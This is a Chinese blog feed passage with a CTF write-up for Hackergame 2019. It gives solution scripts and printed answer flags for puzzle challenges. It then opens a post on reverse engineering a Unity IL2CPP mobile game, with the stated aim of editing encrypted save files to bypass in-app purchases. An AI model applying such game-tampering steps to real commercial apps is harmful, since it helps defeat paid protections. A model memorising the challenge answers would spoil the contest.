+<p><strong>flag{Whit3sp4c3_is_a_difficult_pr0gr4m_l4ngu4g3}</strong></p>
+
+
+
+<h2>我想要个家 250</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>有一天，C 同学做了一个梦，他竟然搬进了大房子，只是似乎有些地方 C 同学不太满意……<br>注意：<br>此题考察的是对于 Linux 基础知识的掌握。尽管可以，但不建议使用逆向工程的方式完成。<br>在根目录（<code>/</code>）下的文件夹对 Linux 系统的运行十分重要，<strong>请不要为了完成此题目删除自己的&nbsp;<code>/usr</code>,&nbsp;<code>/bin</code>&nbsp;等文件夹！</strong> </p><cite><a rel="noreferrer noopener" aria-label="下载 (opens in a new tab)" href="https://mega.nz/#!t0RxySJS!Q1lEFK9ZYLGXD388Wr7YAyFmkgMw8uOdXhfcC7qr_sA" target="_blank">题目文件</a></cite></blockquote>
+
+
+
+<p>看了题目中“温馨”的提示，立马打开了逆向工具——嗯，啥都看不懂。好吧，只好拿出一台没啥用的机子，乖乖跑程序。</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="359" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.2-1024x359.jpg" alt="" class="wp-image-1378" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.2-1024x359.jpg 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.2-300x105.jpg 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.2-768x269.jpg 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.2.jpg 1157w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>程序一开始只是让我在根目录建几个文件夹，但接着画风突变，开始要求我删除根目录下的系统目录。</p>
+
+
+
+<p>参考<a rel="noreferrer noopener" aria-label="这里 (opens in a new tab)" href="https://unix.stackexchange.com/questions/264341/linux-unix-proc-rename" target="_blank">这里</a>的方法重名了几个目录，再用 <code>mv</code> 命令将 <code>bin</code> 等目录重名为了 <code>bin1</code>。</p>
+
+
+
+<p>程序紧接着开始得寸进尺，提出了更多条件，要我将两个文件连通。由于我的 <code>/bin</code> 已经没了，接下来的命令需要以 <code>/bin1/ln</code> 的形式输入。</p>
+
+
+
+<p>接着程序要求我建立一个文件，里面始终能够获得当前的北京时间。感觉上是要做一个类似 <code>/dev/urandom</code> 这样的伪设备，不过我直接写了个脚本，不断循环把当前时间写入指定的文件。</p>
+
+
+
+<p>最后，程序让我 <code>sleep</code> 10 秒，没错，我的 <code>bin</code> 已经没了。输入命令 <code>/bin1/sleep 10</code>，获得 flag。</p>
+
+
+
+<p>哦对了，获得 flag 后还有最后一步，就是去服务器控制面板重装系统&#8230;&#8230;</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="114" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.1-1024x114.jpg" alt="" class="wp-image-1377" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.1-1024x114.jpg 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.1-300x33.jpg 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.1-768x86.jpg 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-10.1.jpg 1275w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>获得 flag 后根目录的画风</figcaption></figure>
+
+
+
+<h2>宇宙终极问题 450</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>天何所杳, 十二焉分?<br>日月安属, 列星安陈?<br>浩瀚宇宙的一个寻常星系里, 弥漫六合的暗物质晕中, 远古的诗歌在狄拉克海上无声回荡.<br>史诗般的超级计算机&nbsp;<strong>Deep Thought</strong>&nbsp;, 寒冷星空下的百万亿场效应管, 人类终得以一窥这个宇宙最深层的奥秘.<br>没错, 就是 42, 对于生命, 对于宇宙, 对于世间万物的答案. </p><cite>第一小题：请给出一组 x y z，使得 x^3 + y^3 + z^3 = 42<br>第二小题：给定 n = random_prime(2^256) * random_prime(2^256) ，请给出一组 a b c d i j k l，使得 a^3 + b^3 + c^3 + d^3 = i^2 + j^2 + k^2 + l^2 = n<br>第三小题：给定 n = randint(2^256) ，请给出一组 p q，使得 p^2 + q^2 = n</cite></blockquote>
+
+
+
+<p>数学不好真是抱歉了。这题完全是用 Google<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> 搜索求解的。</p>
+
+
+
+<p>第一小题通过搜索可以找到答案。<br>第二小题通过搜索可以找到两个求解页面：<a rel="noreferrer noopener" aria-label="四平方 (opens in a new tab)" href="https://www.alpertron.com.ar/FSQUARES.HTM" target="_blank">四平方</a> <a rel="noreferrer noopener" aria-label="四立方 (opens in a new tab)" href="https://www.alpertron.com.ar/FCUBES.HTM" target="_blank">四立方</a>（作者也提供了<a rel="noreferrer noopener" aria-label="源码 (opens in a new tab)" href="https://github.com/alpertron/calculators" target="_blank">源码</a>）。<br>第三小题根据我的理解，并非所有的 n 都可以表示成两个数的平方和。因此多次获取不同的 n，并放到四平方求解页面尝试求解。</p>
+
+
+
+<p><strong>flag{W0W_you_kn0w_the_Answer_t0_l1f3_Un1v3r5e_&amp;_Everyth1ng_77cdda6cca}<br>flag{N0W_you_Alr3ady_kn0w_Everyth1ng_043484f4db}<br>flag{You_DO_kn0w_M0re_Th4n_Everyth1ng_774656f052}</strong></p>
+
+
+
+<p>这题告诉了我们，数学在 CTF 里很重要。（<s>Google<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" /> 搜索在 CTF 里也很重要</s>）</p>
+
+
+
+<h2>无限猴子定理 250</h2>
+
+
+
+<blockquote class="wp-block-quote"><p>无限猴子定理指出：一只猴子在打字机上仅靠随机按键，几乎必然能够在足够长的时间后打出莎士比亚的全套著作，自然也能打出本次比赛的所有 flag。<br>小郑曾经和小赵说过：宇宙的本质是计算。因此，小赵认为，辅助利用计算机生成的随机数，能够更容易地找到 flag 等有意义的信息，从而大大缩短验证无限猴子定理的时间。小赵找到了一串猴子打出的文本（<code>might_be_flag.txt</code>），并自行编写了生成随机数的程序（<code>find_flag.py</code>）。<br>一系列随机数将会通过程序源源不断地生成，而每个随机数都可能在文本中对应出一个正确的 flag。小赵到底能不能如愿以偿地拿到 flag 呢？<br>注：<br>1. flag 一定代表一串有意义的英文单词序列，但本题完全不需要任何程度的基于机器的自然语言识别。<br>2. 和本次比赛的其他 flag 类似，本题的对应 flag 中可能有英文字母被替换混淆。<br>3. flag 代表的第一个英文单词既不会是名词，也不会是形容词。 </p></blockquote>
+
+
+
+<div class="wp-block-file"><a href="https://coxxs.me/wp-content/uploads/2019/10/InfMonkey.zip">InfMonkey.zip</a><a href="https://coxxs.me/wp-content/uploads/2019/10/InfMonkey.zip" class="wp-block-file__button" download>下载</a></div>
+
+
+
+<p>运行程序后，不断产生形如 <code>(0x0123) =&gt; flag{.....}</code> 的字符串。移除程序中的 sleep 延时代码，并将这些生成的 flag 保存为文件，注意到每生成 65512 轮 flag 后就会回到起点，开始生成与刚才相同的 flag。也就是说，总共生成了 65512 个不同的 flag。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">(0x0000) => flag{EH650ARRBN6wFygy3E}
+(0x316B) => flag{EELPa1VXQdAYxlD1Fx}
+(0xB110) => flag{xVd+7waO7T0B5pAs2n}
+(0x7762) => flag{n+TkwdI21/wzJ5YiId}
+(0x01A9) => flag{dwcbomCw/sRu2BT+H/}
+......</pre>
+
+
+
+<p>由于题目提到 flag 中包含单词，于是我就提取出这些 flag 中包含多个单词的 flag。然而，在人力二次检索几千个 flag 后，依然一无所获。</p>
+
+
+
+<p>再次分析程序，注意到这里所生成的 flag 中的字符，事实上都来自 <code>might_be_flag.txt</code> 文件中的不同位置。那有没有可能有一些位置并没有被用到呢？修改程序，将在 <code>might_be_flag.txt</code> 文件中被使用过的位置剔除。运行后，确实留下了一些从未被用过的字符。</p>
+
+
+
+<p>将这些字符直接连接并看不出什么，但如果强行让这些字符参与到随机序列的生成呢？于是将其中的一个字符的位置作为 <code>random_iter</code> 的起点，运行生成 flag。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">python find_flag.py
+ (0x0C2A) => flag{+8ad+LC+Generat0r+}
+ (0xBB4F) => flag{+A+8ad+LC+Generat0}
+ (0x6A79) => flag{0r+A+8ad+LC+Genera}
+ (0x19A3) => flag{at0r+A+8ad+LC+Gene}
+ (0xC8C8) => flag{erat0r+A+8ad+LC+Ge}
+ (0x77F2) => flag{enerat0r+A+8ad+LC+}
+ (0x271C) => flag{+Generat0r+A+8ad+L}
+ (0xD641) => flag{LC+Generat0r+A+8ad}
+ (0x856B) => flag{d+LC+Generat0r+A+8}
+ (0x3495) => flag{8ad+LC+Generat0r+A}
+ (0xE3BA) => flag{A+8ad+LC+Generat0r} # Flag
+ (0x92E4) => flag{r+A+8ad+LC+Generat}
+ (0x420E) => flag{t0r+A+8ad+LC+Gener}
+ (0xF133) => flag{rat0r+A+8ad+LC+Gen}
+ (0xA05D) => flag{nerat0r+A+8ad+LC+G}
+ (0x4F87) => flag{Generat0r+A+8ad+LC}
+ (0xFEAC) => flag{C+Generat0r+A+8ad+}
+ (0xADD6) => flag{+LC+Generat0r+A+8a}
+ (0x5D00) => flag{ad+LC+Generat0r+A+}</pre>
+
+
+
+<p>直到这时，我才理解题目中几条提示的意义&#8230; 好吧，<code>A</code> 确实不是名词，也不是形容词&#8230; (╯‵□′)╯︵┻━┻</p>
+
+
+
+<p><strong>flag{A+8ad+LC+Generat0r}</strong></p>
+
+
+
+<h2>PowerShell 迷宫 250</h2>
+
+
+
+<blockquote class="wp-block-quote"><p><a href="https://gist.github.com/Coxxs/b8a38f6fe64db1e0f7580a864ddad4b8">题目说明</a></p></blockquote>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="651" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.1-1024x651.png" alt="" class="wp-image-1373" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.1-1024x651.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.1-300x191.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.1-768x488.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.1-1568x996.png 1568w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>一道 Powershell 实现的迷宫。由于只提供了浏览器的终端，因此基本上是要写 Powershell 脚本丢上去解题了。但我就是不想写 PS 脚本&#8230;</p>
+
+
+
+<h3>解法1</h3>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="807" height="1022" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.2.png" alt="" class="wp-image-1374" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.2.png 807w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.2-237x300.png 237w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.2-768x973.png 768w" sizes="(max-width: 807px) 100vw, 807px" /></figure>
+
+
+
+<p>在意识到迷宫的规模后，我放弃了手画，开始让程序自动画&#8230;</p>
+
+
+
+<h3>解法2</h3>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">socket.send('[选手token]\r\n')
+
+j = localStorage.getItem('maze')
+var m
+if (!j) {
+  m = {
+    x: 70,
+    y: 70,
+    horiz: new Array(71).fill(0).map(row => new Array(71).fill(false)),
+    verti: new Array(71).fill(0).map(row => new Array(71).fill(false)),
+    pos: new Array(71).fill(0).map(row => new Array(71).fill(false)),
+    here: [0, 0]
+  }
+} else {
+  m = JSON.parse(j)
+}
+
+
+function display(m) {
+  var text= [];
+  for (var j= 0; j&lt;m.x*2+1; j++) {
+    var line= [];
+    if (0 == j%2)
+      for (var k=0; k&lt;m.y*4+1; k++)
+        if (0 == k%4) 
+          line[k]= '+';
+        else
+          if (j>0 &amp;&amp; m.verti[j/2-1][Math.floor(k/4)])
+            line[k]= ' ';
+          else
+            line[k]= '-';
+    else
+      for (var k=0; k&lt;m.y*4+1; k++)
+        if (m.here &amp;&amp; m.here[0]*2+1 == j &amp;&amp; m.here[1]*4+2 == k) 
+          line[k]= '#'
+        else if ((k-2)%4 == 0 &amp;&amp; (j-1)%2 == 0 &amp;&amp; m.pos[(j-1)/2][(k-2)/4] === false)
+          line[k]= '?'
+        else if ((k-2)%4 == 0 &amp;&amp; (j-1)%2 == 0 &amp;&amp; m.pos[(j-1)/2][(k-2)/4] === 2)
+          line[k]= '.'
+        else if (0 == k%4)
+          if (k>0 &amp;&amp; m.horiz[(j-1)/2][k/4-1])
+            line[k]= ' ';
+          else
+            line[k]= '|';
+        else
+          line[k]= ' ';
+    if (0 == j) line[1]= line[2]= line[3]= ' ';
+    if (m.x*2-1 == j) line[4*m.y]= ' ';
+    text.push(line.join('')+'\r\n');
+  }
+  return text.join('');
+}
+
+socket.onmessage = event => {
+  if (event.data.indexOf('flag{') >= 0) {
+    console.log(event.data);
+    alert(event.data);
+  }
+  var regex = /\s+(Up|Down|Left|Right)\s+(\d+)\s+(\d+)(.*)/g
+  var match
+  while (match = regex.exec(event.data)) {
+    update(match[1], Number(match[2]), Number(match[3]), match[4].trim())
+  }
+}
+
+function update(direction, x, y, flag) {
+  if (flag) {
+    console.log(flag)
+    alert(flag)
+  }
+  if (direction == 'Left') {
+    m.here = [y, x + 1]
+    m.horiz[y][x] = true
+    m.pos[y][x + 1] = true
+    if (m.pos[y][x] === false) m.pos[y][x] = 2
+  }
+  if (direction == 'Right') {
+    m.here = [y, x - 1]
+    m.horiz[y][x - 1] = true
+    m.pos[y][x - 1] = true
+    if (m.pos[y][x] === false) m.pos[y][x] = 2
+  }
+  if (direction == 'Up') {
+    m.here = [y + 1, x]
+    m.verti[y][x] = true
+    m.pos[y + 1][x] = true
+    if (m.pos[y][x] === false) m.pos[y][x] = 2
+  }
+  if (direction == 'Down') {
+    m.here = [y - 1, x]
+    m.verti[y - 1][x] = true
+    m.pos[y - 1][x] = true
+    if (m.pos[y][x] === false) m.pos[y][x] = 2
+  }
+  console.log(direction + ' ' + x + ' ' + y)
+}
+
+document.onkeydown = function (e) {
+    // go to the back
+    if (e.keyCode == 32) {
+    socket.send("cd ..; ls\r\n")
+    }
+    // go to the right
+    if (e.keyCode == 39) {
+    socket.send("cd right; ls\r\n")
+    }
+    // go to the left
+    if (e.keyCode == 37) {
+    socket.send("cd left; ls\r\n")
+    }
+    // go to the up
+    if (e.keyCode == 38) {
+    socket.send("cd up; ls\r\n")
+    }
+    // go to the down
+    if (e.keyCode == 40) {
+    socket.send("cd down; ls\r\n")
+    }
+};
+
+var e = document.createElement('div');
+e.innerHTML = `
+&lt;div id="maze" style="position:absolute; opacity:.93; left:0; right:0; top:0; bottom: 0; z-index:100; background-color: white; font-size: 7px; font-weight: bolder; font-family: monospace; line-height: 3.95px; letter-spacing: -1px;">&lt;pre id="mt">&lt;/pre>&lt;/div>
+`;
+document.body.appendChild(e);
+
+function draw() {
+  document.getElementById('mt').innerHTML = display(m);
+  if (Math.random() &lt; 0.05) {
+    localStorage.setItem('maze', JSON.stringify(m));
+  }
+}
+
+g = setInterval(draw, 80)</pre>
+
+
+
+<p>画迷宫部分代码摘自：<a href="https://github.com/freeCodeCamp/arcade-mode/blob/master/client/scripts/challenges/rosettacode/preformatted/M/Maze%20generation.raw">freeCodeCamp/arcade-mode</a>，在此表示感谢。</p>
+
+
+
+<p>F12 输入代码后，本题就变成了一个迷宫游戏。用键盘开始探索迷宫吧！<code>?</code> 代表未探索的区域，<code>.</code> 代表未探索但确定没有 <code>flag</code> 的位置。</p>
+
+
+
+<p>这段代码会使用 <code>localStorage</code> 自动保存已经探索过的迷宫，超时断线后刷新可继续游玩。</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="656" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.3-1024x656.png" alt="" class="wp-image-1375" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.3-1024x656.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.3-300x192.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.3-768x492.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-9.3-1568x1005.png 1568w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<h3>解法3</h3>
+
+
+
+<p>后来才发现，通过 <code>cd /</code> 回到根目录后，是可以在 <code>/opt/PSMaze.dll</code> 下找到题目二进制的。文件中有 flag 的一部分，另一部分似乎是算出来的。由于已经找到 flag，就没有继续深入。</p>
+
+
+
+<p>用解法2解完题目后，我的内心是崩溃的&#8230; 早知道就乖乖写 PS 脚本去了&#8230; (T_T)</p>
+
+
+
+<p><strong>flag{D0_y0u_1ik3_PSC0r3_n0w_2C6BE488}</strong></p>
+
+
+
+<h2>Flag 红包 350</h2>
+
+
+
+<blockquote class="wp-block-quote"><p> 你知道「<a rel="noreferrer noopener" href="https://lia.ustc-zzzz.net/" target="_blank">一个顶俩（liǎ）</a>」吗？<br>又（快）到了发红包的季节。为了让别人陷入成语红包收不到的尴尬，某同学用了一周的开发时间，精心打造了一个成语接龙 AI。<br>那么，你能抢到他发出的红包吗？<br>成语数据库可以在题目网页的右上角下载。 <br>注：上面链接的网站与题目无关。</p><cite><a href="https://mega.nz/#!hlRnGCyZ!bh2W7--SUeVG892vxj8qmxk8eo-TrnD1yEX950FpyqE" target="_blank" rel="noreferrer noopener" aria-label="成语数据库 (opens in a new tab)">成语数据库</a></cite></blockquote>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.1-1024x974.png" alt="" class="wp-image-1370" width="369" height="350" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.1-1024x974.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.1-300x285.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.1-768x730.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.1.png 1364w" sizes="(max-width: 369px) 100vw, 369px" /></figure></div>
+
+
+
+<p>既然本题放在最后一题，应该不会太容易。果然，我写的感觉起码能赢一两局的答题机器人——最后连一局都赢不了。对方总是能通过成语不能重复使用的规则，在来回几百轮后把我的机器人逼上绝路。</p>
+
+
+
+<p>好吧，原来这又是一道算法题。 既然我算法烂，那就让对面两个机器人互干吧。不过因为每一局第一个词都是“废理兴工”，因此先要让一个机器人接出“工”开头的成语才行。这里写了一个简单的算法来实现，掐起来后就交给机器人们吧~ (*￣3￣)╭</p>
+
+
+
+<p>先将成语列表保存到 <code>localStorage</code> 中，便于之后程序调用。</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="js" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">fetch('/idl.json').then(response => {
+  return response.json();
+}).then(data => {
+  window.localStorage.setItem('dict', JSON.stringify(data))
+}).catch(err => {
+  console.log(err)
+});</pre>
+
+
+
+<p>接着开始让机器人自己干<img src="https://s.w.org/images/core/emoji/13.1.0/72x72/2642.png" alt="♂" class="wp-smiley" style="height: 1em; max-height: 1em;" />自己（程序写的稍有些乱）</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">const dict = JSON.parse(window.localStorage.getItem('dict'))
+
+class bot {
+  constructor (botid, callback) {
+    this.botid = botid
+    this.ready = false
+    this.callback = callback
+
+    this.mysocket = io.connect(window.location.href, {
+      transports: ['websocket']
+    })
+    this.mysocket.on('reply', function(msg) {
+      this.process(msg.data)
+    }.bind(this));
+  }
+
+  process (msg) {
+    console.log(this.botid + ' ↓ ' + msg)
+    if (msg == '服务器给你发送了一个接龙红包:') return
+    this.callback(true, msg)
+    return
+  }
+
+  send (msg) {
+    console.log(this.botid + ' ↑ ' + msg)
+    this.mysocket.emit('go', {data: msg});
+  }
+}
+
+class flxgSolver {
+  constructor (botid, callback) {
+    this.botid = botid
+    this.bot = new bot(botid, this.solve.bind(this))
+    this.first_index = { }
+    this.last_index = { }
+    this.used = []
+    this.danger = {}
+    this.success = false
+    this.callback = callback
+
+    this.init()
+  }
+
+  init() {
+    for (var word in dict) {
+      if (!this.first_index[dict[word].first]) this.first_index[dict[word].first] = []
+      this.first_index[dict[word].first].push(word)
+
+      if (!this.last_index[dict[word].last]) this.last_index[dict[word].last] = []
+      this.last_index[dict[word].last].push(word)
+    }
+
+    this.danger = {}
+    for (var word in dict) {
+      if (this.first_index[dict[word].last] &amp;&amp; !['run'].includes(dict[word].last)) continue
+      let first = dict[word].first
+      if (!this.danger[first]) this.danger[first] = []
+      this.danger[first].push(word)
+    }
+  }
+
+  solve (res, msg) {
+    if (!res) {
+      console.error('disconnected')
+      return false
+    }
+    if (this.success) {
+      this.callback(true, msg)
+      return
+    }
+    this.used.push(msg)
+    var words = []
+    var ban = Object.keys(this.danger)
+    for (var i of this.first_index[dict[msg].last]) {
+      if (this.used.includes(i)) {
+        // console.log(this.botid + ' ' + i + ' 被使用，跳过')
+        continue
+      }
+      if (ban.includes(dict[i].last)) {
+        // console.log(this.botid + ' ' + i + ' 被封禁，跳过')
+        continue
+      }
+      if (dict[i].last == 'gong') {
+        this.success = true
+        words = [ i ]
+        break 
+      }
+      words.push(i)
+    }
+    if (!words.length) {
+      console.error('failed')
+      return false
+    }
+    var word = words[Math.floor(Math.random() * words.length)]
+    // console.log(this.botid + ' ↑ ' + word)
+    this.used.push(word)
+    this.bot.send(word)
+  }
+}
+
+const getid = () => (window.botid = window.botid ? window.botid + 1 : 1)
+
+var solver
+var mainbot
+var end = false
+
+function solver_cb(res, msg) {
+  if (end) return
+  if (msg &amp;&amp; msg.indexOf('的成语!') > 0) {
+    solver.bot.mysocket.close()
+    mainbot.mysocket.close()
+    solver = null
+    mainbot = null
+    setTimeout(main_cb, 5000)
+    return
+  }
+  if (!res) {
+    solver = new flxgSolver('解题器' + getid(), solver_cb)
+    return
+  }
+  if (msg.indexOf('img') > 0) { // success
+    mainbot.send(msg.substr(0, 4))
+    solver.bot.mysocket.close()
+    solver = null
+    return
+  }
+  mainbot.send(msg)
+}
+
+function main_cb(res, msg) {
+  if (msg &amp;&amp; msg.indexOf('flag{') >= 0) {
+    console.log(msg)
+    solver = null
+    mainbot = null
+    end = true
+    return
+  }
+  if (msg &amp;&amp; msg.indexOf('flag 碎片') > 0) return
+  if (msg &amp;&amp; (msg.indexOf('的成语!') > 0 || msg.indexOf('img') > 0)) {
+    solver.bot.mysocket.close()
+    mainbot.mysocket.close()
+    solver = null
+    mainbot = null
+    setTimeout(main_cb, 5000)
+    return
+  }
+  if (!res) {
+    mainbot = new bot('主机', main_cb)
+    return
+  }
+  if (msg == '废理兴工') {
+    solver_cb()
+    return // wait
+  }
+  solver.bot.send(msg)
+}
+
+
+main_cb()</pre>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.3.png" alt="" class="wp-image-1390" width="415" height="490" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.3.png 815w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.3-254x300.png 254w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.3-768x908.png 768w" sizes="(max-width: 415px) 100vw, 415px" /><figcaption>左右互搏现场</figcaption></figure></div>
+
+
+
+<p>考虑进一些意外情况，每一局胜率不到 50%，不过这样的胜率连赢 4 局也够了。看着两个机器人玩耍了一阵子后，获得 flag。</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="672" src="https://coxxs.me/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2-1024x672.png" alt="" class="wp-image-1371" srcset="https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2-1024x672.png 1024w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2-300x197.png 300w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2-768x504.png 768w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2-1568x1029.png 1568w, https://dev.moe/wp-content/uploads/2019/10/nLT8hv2lOCJ-8.2.png 1976w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p><strong>flag{True_Virtuoso_of_Chinese_Idioms_89f2516f46}</strong></p>
+
+
+
+<hr class="wp-block-separator"/>
+
+
+
+<p>最终得分：5200， 总排名：4 / 1904</p>
+
+
+
+<p><strong>Coxxs</strong></p>
+<p><a rel="nofollow" href="https://dev.moe/1321">Hackergame 2019（中科大信安赛）write up</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/1321/feed</wfw:commentRss>
+			<slash:comments>11</slash:comments>
+		
+		<enclosure url="https://coxxs.me/wp-content/uploads/2019/10/flag.mid" length="14050" type="audio/midi" />
+
+		<post-id xmlns="com-wordpress:feed-additions:1">1321</post-id>	</item>
+		<item>
+		<title>记一次 Unity IL2CPP 游戏逆向</title>
+		<link>https://dev.moe/1282</link>
+					<comments>https://dev.moe/1282#comments</comments>
+		
+		<dc:creator><![CDATA[Coxxs]]></dc:creator>
+		<pubDate>Mon, 26 Aug 2019 01:11:05 +0000</pubDate>
+				<category><![CDATA[Code]]></category>
+		<guid isPermaLink="false">https://coxxs.me/?p=1282</guid>
+
+					<description><![CDATA[<p>本文由 Coxxs 原创，转载须注明原文链接：https://dev.moe/1282 Instant App<a class="more-link" href="https://dev.moe/1282">继续阅读<span class="screen-reader-text">"记一次 Unity IL2CPP 游戏逆向"</span></a></p>
+<p><a rel="nofollow" href="https://dev.moe/1282">记一次 Unity IL2CPP 游戏逆向</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p> 本文由 Coxxs 原创，转载须注明原文链接：<a href="https://dev.moe/1282">https://dev.moe/1282</a></p>
+
+
+
+<p>Instant Apps 真是个可怕的东西。</p>
+
+
+
+<p>闲着没事就点开了个愤怒的小鸟出品的 Dream Blast 试玩，玩了几分钟觉着有意思，就下了 70MB 的完整版游戏。于是乎，几个小时就玩没了&#8230;</p>
+
+
+
+<p>手游嘛，开头吸引人，后期总是氪氪氪。虽然我支持正版，但内购却并不讨喜。这游戏又有内购联网验证。思前想后，不如直接改存档吧。几经尝试，找到了位于   <code>sdcard/Android/data/com.ro**o.dream/files/users/[userid]/prefs.json</code> 的游戏存档文件。打开一看，好好的一个 .json 文件，怎么里面全是乱码呢。好吧，找加密算法去吧。</p>
+
+
+
+<span id="more-1282"></span>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/08/image-7.png" alt="" class="wp-image-1294" width="255" height="342" srcset="https://dev.moe/wp-content/uploads/2019/08/image-7.png 383w, https://dev.moe/wp-content/uploads/2019/08/image-7-224x300.png 224w" sizes="(max-width: 255px) 100vw, 255px" /><figcaption>内购再见！</figcaption></figure></div>
+
+
+
+<h2>还原 IL2CPP</h2>
+
+
+
+<p>解包游戏大致看了看，classes.dex 里都是些无关紧要的东西，游戏逻辑估计是写 Unity 代码里了。找了找并没有 Unity 的 .NET 二进制文件 <code>assets/bin/Data/Managed/Assembly-CSharp.dll</code>，原来是用了 <a rel="noreferrer noopener" aria-label="IL2CPP (opens in a new tab)" href="https://docs.unity3d.com/Manual/IL2CPP.html" target="_blank">IL2CPP</a> 来编译。这样一来，游戏用到的字符串等被放到了 <code>assets/bin/Data/Managed/Metadata/global-metadata.dat</code>，而游戏二进制文件则位于 <code>lib/armeabi-v7a/libil2cpp.so</code>。</p>
+
+
+
+<p>要分析 IL2CPP 后的文件原本并不容易，即使没有经过混淆，但由于字符串、函数名等基本上都被拿到了单独的文件，很难找到需要找的代码段。好在 <a rel="noreferrer noopener" aria-label="Perfare (opens in a new tab)" href="https://www.perfare.net/" target="_blank">Perfare</a> 大神写了个 <a rel="noreferrer noopener" aria-label="Il2CppDumper (opens in a new tab)" href="https://github.com/Perfare/Il2CppDumper" target="_blank">Il2CppDumper</a>，可以分析这两个文件，并将字符串、函数名通过 IDA 显示在二进制文件的对应位置。</p>
+
+
+
